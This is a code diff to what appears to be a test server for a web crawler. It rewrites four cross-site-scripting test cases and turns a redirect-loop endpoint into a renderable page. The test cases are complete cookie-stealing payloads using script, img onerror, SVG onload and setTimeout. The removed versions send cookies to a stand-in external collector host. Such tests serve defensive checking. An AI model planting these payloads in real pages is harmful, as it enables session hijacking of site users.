@@ -410,25 +410,25 @@ SECURITY_TEST_GROUPS = {
             (
                 "A1",
                 "Script steals cookie",
-                "<script>fetch('https://collector.invalid/cookie?value=' + encodeURIComponent(document.cookie))</script>",
+                "<script>fetch('/collect/cookie?v=' + encodeURIComponent(document.cookie))</script>",
                 "Crawler output should keep the script-looking text inert when displayed as HTML.",
             ),
             (
                 "A2",
                 "Image onerror steals cookie",
-                "<img src=x onerror=\"fetch('https://collector.invalid/cookie?value=' + encodeURIComponent(document.cookie))\">",
+                "<img src=x onerror=\"fetch('/collect/cookie?v=' + encodeURIComponent(document.cookie))\">",
                 "Crawler output should not render this as an executable image error handler.",
             ),
             (
                 "A3",
                 "SVG onload steals cookie",
-                "<svg onload=\"navigator.sendBeacon('https://collector.invalid/cookie', document.cookie)\"></svg>",
+                "<svg onload=\"navigator.sendBeacon('/collect/cookie', document.cookie)\"></svg>",
                 "Crawler output should not render this as an executable SVG load handler.",
             ),
             (
                 "A4",
                 "Delayed cookie steal with setTimeout",
-                "<script>setTimeout(() => fetch('https://collector.invalid/cookie?delayed=' + encodeURIComponent(document.cookie)), 1500)</script>",
+                "<script>setTimeout(() => fetch('/collect/cookie?v=' + encodeURIComponent(document.cookie)), 1500)</script>",
                 "Crawler output should keep delayed script text inert.",
             ),
         ],
@@ -2920,9 +2920,14 @@ async def redirect_loop_a():
     return RedirectResponse("/redirect-loop-b", status_code=302)
 
 
-@app.get("/redirect-loop-b")
+@app.get("/redirect-loop-b", response_class=HTMLResponse)
 async def redirect_loop_b():
-    return RedirectResponse("/redirect-loop-a", status_code=302)
+    body = """
+    <p>Redirect loop B is a valid renderable page reached after /redirect-loop-a redirects here.</p>
+    <p>This page includes body content so browser-based checks can confirm the redirect target loaded.</p>
+    <a href="/about?from=redirect-loop-b">About child from redirect loop B</a>
+    """
+    return html_page("Redirect Loop B", body)
 
 
 @app.get("/depth/0", response_class=HTMLResponse)
